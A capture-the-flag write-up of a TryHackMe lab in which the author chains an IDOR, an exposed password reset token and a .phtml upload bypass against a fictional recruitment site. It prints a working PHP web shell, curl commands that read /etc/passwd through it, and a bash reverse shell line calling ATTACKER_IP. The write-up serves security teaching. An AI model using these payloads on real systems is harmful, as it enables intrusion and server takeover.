# Room Name :Guided Pentest: Web

## Overview

This lab simulated a full web application penetration test against a fictional recruitment platform called RecruitX.

---

# Objectives

1. Reconnaissance and Enumeration
2. User Access Testing
3. Authorization Testing
4. Authentication Weakness Testing
5. Privilege Escalation
6. Remote Code Execution
---

# Target Information

| Field | Value |
|------|-|
| Target IP | 10.49.137.190 |
| Room Name |Guided Pentest: Web |
| Difficulty | Medium |
| Platform | TryHackMe |

---

# Reconnaissance & Enumeration

## Nmap Scan

### Command

```bash
nmap -sV -sC -p- 10.49.137.190
```

### Output

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 51:09:48:16:ca:14:38:24:fb:f5:99:35:7e:69:ab:bd (ECDSA)
|_  256 12:53:ed:95:6a:62:21:9e:58:97:18:be:5c:df:ba:11 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitX - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
### Analysis

I find there is a RecuitX was running on the port 80 . Our main target is web so , we not focus on the RecuitX 

---

# Web Enumeration
 
## Gobuster Scan

### Command

```bash 
gobuster dir -u http://10.49.137.190 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -x php 
```

### Output

```text ===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 21600]
/profile.php          (Status: 302) [Size: 0] 
/login.php            (Status: 200) [Size: 15107]
/jobs.php             (Status: 200) [Size: 20288]
/uploads              (Status: 301) [Size: 314] 
/data                 (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] 
/test                 (Status: 200) [Size: 705]
/includes             (Status: 301) [Size: 315]
/api                  (Status: 301) [Size: 310] 
/logout.php           (Status: 302) [Size: 0] 
/config               (Status: 301) [Size: 313] 
/dashboard.php        (Status: 302) [Size: 0] 
/register.php         (Status: 200) [Size: 17384]
/reset.php            (Status: 200) [Size: 14408]
/.php                 (Status: 403) [Size: 277]
Progress: 175328 / 175330 (100.00%)
===============================================================
Finished
===============================================================
```

### Analysis

By the result the intresting directory we find is that /includes and /api . 
### Exploring the /api
I use curl to check the /api directory 
#### Command :

```bash   
 curl http://10.49.137.190/api/
 ``` 
#### Result :
````
{"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]} 
````
##### By the result we find 3 sub directories /user , /jobs and /applications we will use this for later in the lab . 
----
They provide the username and password to login as:
- Email: testuser@fake.thm
- Password:Password123


# Vulnerability Discovery

## 1.IDOR

### Description

The IDOR vulnerability happens when the user was replace their id parameter to another id of the user , then the user can able to see the other user data .  

### Steps Performed

1. I first login with those credientials 
2. Then I navigated to the My profile (which is test ) , There my url was like this :http://10.49.137.190/profile.php?id=6
3. So I changed the (id=6) to (id=1)
4. I saw the administator details 
### Command / Payload

```bash
 curl -i  "http://10.49.137.190/api/user?id=1"
```
### Output

```text
HTTP/1.1 200 OK
Date: Tue, 26 May 2026 10:34:29 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=r3mtekd09stcgj769hm8jjdrft; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 112
Content-Type: application/json

{"id":1,"name":"Sarah Mitchell","email":"s.mitchell@recruitx.thm","role":"administrator","created":"2026-03-24"} 

```

### Screenshot

![Screenshot](screenshots/Screenshot%202026-05-26%20162613.png)

### Impact

By this attacker will directly get the privilege access , so he will do unintended things that will effect the company . 

---

# 2. Weak Password Reset

## Description

The application exposed password reset tokens directly in the HTTP response instead of securely sending them through email.

This allowed account takeover when combined with the previously discovered administrator email address.

---

## Administrator Email Discovery

The administrator email was previously discovered through the IDOR vulnerability:

```text
s.mitchell@recruitx.thm
```

---

## Password Reset Endpoint

Navigated to:

```text
http://TARGET_IP/reset.php
```

---

## Token Generation Testing

Generated multiple reset tokens using a admin account.

### Observed Tokens

```text
784512
291037
503648
```

---

## Analysis

The password reset implementation contained several weaknesses:

- Reset tokens were exposed directly in the response
- Tokens used only 6 numeric digits
- Small token keyspace
- No rate limiting protections
- Weak reset flow design

---

## Impact

An attacker could:
- reset arbitrary user passwords
- compromise administrator accounts
- gain unauthorized access

---

## Administrator Account Takeover

## Description

Using the exposed reset token, the administrator password was reset successfully.

Authentication as the administrator account succeeded afterward.

---

## Screenshot
![Screenshot](screenshots/Screenshot%202026-05-26%20162629.png)
---

## Analysis

This vulnerability became critical when chained with the IDOR vulnerability that leaked the administrator email address.

---

# 3. File Upload Vulnerability

## Description

The administrator dashboard exposed a file upload feature:

```text
/admin/upload.php
```

The application attempted to restrict uploads using client-side validation.

---

### Initial File Upload Testing

#### Creating Test File

```bash
echo "This is a test file" > test.txt
```

The upload was rejected.

---

## PHP Upload Testing

### Creating PHP File

```bash
echo '<?php echo "PHP is executing"; ?>' > test.php
```

The upload was rejected.
## Screenshot

![Screenshot](screenshots/Screenshot%202026-05-26%20164708.png)

---

## Bypass Using Alternative Extension

### Creating PHTML File

```bash
echo '<?php echo "PHP is executing"; ?>' > test.phtml
```

The upload succeeded.
## Screenshot

![Screenshot](screenshots/Screenshot%202026-05-26%20164805.png)


---

## Verification

Visited:

```text
http://TARGET_IP/uploads/documents/test.phtml
```

The PHP code executed successfully on the server.

---

## Analysis

The application:
- blocked `.php`
- failed to block alternative PHP extensions
- relied on incomplete extension filtering

Apache processed `.phtml` files as executable PHP.

---

## Impact

An attacker with upload access could:
- upload executable code
- gain remote code execution
- fully compromise the server

---

# 4. Remote Code Execution (RCE)

## Description

After gaining administrator access, the upload functionality was abused to upload a malicious PHP web shell.

This resulted in arbitrary command execution on the server.

---

## Web Shell Creation

### Payload

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

Saved as:

```text
shell.phtml
```

---

## Uploading the Web Shell

Uploaded the file through:

```text
/admin/upload.php
```

The upload succeeded because `.phtml` files were allowed.


---

# Command Execution

## Verifying Remote Code Execution

### Command

```bash
curl "http://TARGET_IP/uploads/documents/shell.phtml?cmd=whoami"
```

### Output

```text
www-data
```

---

## Additional Enumeration

### Command

```bash
curl "http://TARGET_IP/uploads/documents/shell.phtml?cmd=id"
```

### Output

```text
uid=33(www-data) gid=33(www-data)
```

---

## System Information

### Command

```bash
curl "http://TARGET_IP/uploads/documents/shell.phtml?cmd=uname+-a"
```

### Output

```text
Linux example-hostname Ubuntu x86_64
```


---

# Sensitive File Access

## Reading `/etc/passwd`

### Command

```bash
curl "http://TARGET_IP/uploads/documents/shell.phtml?cmd=cat+/etc/passwd"
```

### Output

```text
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:115:123:MySQL Server
```

---

## Analysis

The web shell allowed:
- arbitrary command execution
- access to sensitive system files
- server-side enumeration

This level of access could lead to:
- credential disclosure
- database compromise
- privilege escalation

---

# Reverse Shell

## Listener Setup

### Command

```bash
nc -lvnp 4444
```

---

## Reverse Shell Payload

### Command

```bash
curl "http://TARGET_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

---

## Reverse Shell Access

### Output

```text
Connection received
www-data@example-hostname
```
Then I navigated to /var/www , I find the flag.txt .
---

## Screenshot

![Screenshot](screenshots/Screenshot%202026-05-26%20171448.png)

---

## Impact

The attacker gained:
- interactive shell access
- full command execution
- internal system enumeration capabilities

---

# Vulnerability Chain Summary

| Stage | Vulnerability | Impact |
|------|------|------|
| 1 | Enumeration | Application mapping |
| 2 | IDOR | Administrator email disclosure |
| 3 | Weak Password Reset | Administrator account takeover |
| 4 | File Upload Bypass | Arbitrary PHP upload |
| 5 | Remote Code Execution | Full server compromise |

---

# Remediation Recommendations

| Vulnerability | Severity | Recommendation |
|------|------|------|
| IDOR | High | Implement server-side authorization checks |
| Weak Password Reset | Critical | Use secure random tokens and email-only delivery |
| File Upload Bypass | Critical | Use allowlists and store uploads outside web root |
| API Disclosure | Medium | Restrict internal API endpoints |
| Remote Code Execution | Critical | Disable code execution in upload directories |

---

# Key Takeaways

- Multiple low-severity vulnerabilities can be chained into critical compromise
- Client-side validation should never be trusted
- Password reset flows require strong security controls
- Upload functionality must be strictly validated
- Remote code execution often begins from weak upload filtering
